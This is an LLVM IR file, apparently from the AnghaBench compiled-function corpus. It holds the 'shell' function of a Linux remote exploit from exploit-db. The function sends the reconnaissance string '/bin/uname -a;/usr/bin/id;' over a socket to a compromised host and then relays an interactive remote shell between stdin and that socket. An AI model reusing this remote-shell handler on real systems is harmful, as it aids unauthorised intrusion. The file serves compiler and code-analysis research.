; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21818.c_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21818.c_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [28 x i8] c"/bin/uname -a;/usr/bin/id;\0A\00", align 1
@sock = common dso_local global i64 0, align 8
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [5 x i8] c"EOF\0A\00", align 1
@.str.2 = private unnamed_addr constant [19 x i8] c"Connection lost.\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @shell() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [1024 x i8], align 16
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str, i64 0, i64 0), i8** %3, align 8
  %5 = call i32 @FD_ZERO(i32* %1)
  %6 = load i64, i64* @sock, align 8
  %7 = call i32 @FD_SET(i64 %6, i32* %1)
  %8 = call i32 @FD_SET(i64 0, i32* %1)
  %9 = load i64, i64* @sock, align 8
  %10 = load i8*, i8** %3, align 8
  %11 = load i8*, i8** %3, align 8
  %12 = call i32 @strlen(i8* %11)
  %13 = call i64 @send(i64 %9, i8* %10, i32 %12, i32 0)
  br label %14

14:                                               ; preds = %0, %62
  %15 = load i64, i64* @sock, align 8
  %16 = call i32 @FD_SET(i64 %15, i32* %1)
  %17 = call i32 @FD_SET(i64 0, i32* %1)
  %18 = load i64, i64* @sock, align 8
  %19 = add nsw i64 %18, 1
  %20 = call i64 @select(i64 %19, i32* %1, i32* null, i32* null, i32* null)
  %21 = icmp slt i64 %20, 0
  br i1 %21, label %22, label %23

22:                                               ; preds = %14
  br label %64

23:                                               ; preds = %14
  %24 = load i64, i64* @sock, align 8
  %25 = call i64 @FD_ISSET(i64 %24, i32* %1)
  %26 = icmp ne i64 %25, 0
  br i1 %26, label %27, label %43

27:                                               ; preds = %23
  %28 = load i64, i64* @sock, align 8
  %29 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 0
  %30 = call i32 @recv(i64 %28, i8* %29, i32 1024, i32 0)
  store i32 %30, i32* %4, align 4
  %31 = icmp slt i32 %30, 0
  br i1 %31, label %32, label %36

32:                                               ; preds = %27
  %33 = load i32, i32* @stderr, align 4
  %34 = call i32 @fprintf(i32 %33, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %35 = call i32 @exit(i32 2) #3
  unreachable

36:                                               ; preds = %27
  %37 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 0
  %38 = load i32, i32* %4, align 4
  %39 = call i64 @write(i32 1, i8* %37, i32 %38)
  %40 = icmp slt i64 %39, 0
  br i1 %40, label %41, label %42

41:                                               ; preds = %36
  br label %64

42:                                               ; preds = %36
  br label %43

43:                                               ; preds = %42, %23
  %44 = call i64 @FD_ISSET(i64 0, i32* %1)
  %45 = icmp ne i64 %44, 0
  br i1 %45, label %46, label %62

46:                                               ; preds = %43
  %47 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 0
  %48 = call i32 @read(i32 0, i8* %47, i32 1024)
  store i32 %48, i32* %4, align 4
  %49 = icmp slt i32 %48, 0
  br i1 %49, label %50, label %54

50:                                               ; preds = %46
  %51 = load i32, i32* @stderr, align 4
  %52 = call i32 @fprintf(i32 %51, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %53 = call i32 @exit(i32 2) #3
  unreachable

54:                                               ; preds = %46
  %55 = load i64, i64* @sock, align 8
  %56 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 0
  %57 = load i32, i32* %4, align 4
  %58 = call i64 @send(i64 %55, i8* %56, i32 %57, i32 0)
  %59 = icmp slt i64 %58, 0
  br i1 %59, label %60, label %61

60:                                               ; preds = %54
  br label %64

61:                                               ; preds = %54
  br label %62

62:                                               ; preds = %61, %43
  %63 = call i32 @usleep(i32 10)
  br label %14

64:                                               ; preds = %60, %41, %22
  %65 = load i32, i32* @stderr, align 4
  %66 = call i32 @fprintf(i32 %65, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0))
  %67 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i64, i32*) #1

declare dso_local i64 @send(i64, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @select(i64, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i64, i32*) #1

declare dso_local i32 @recv(i64, i8*, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @write(i32, i8*, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @usleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
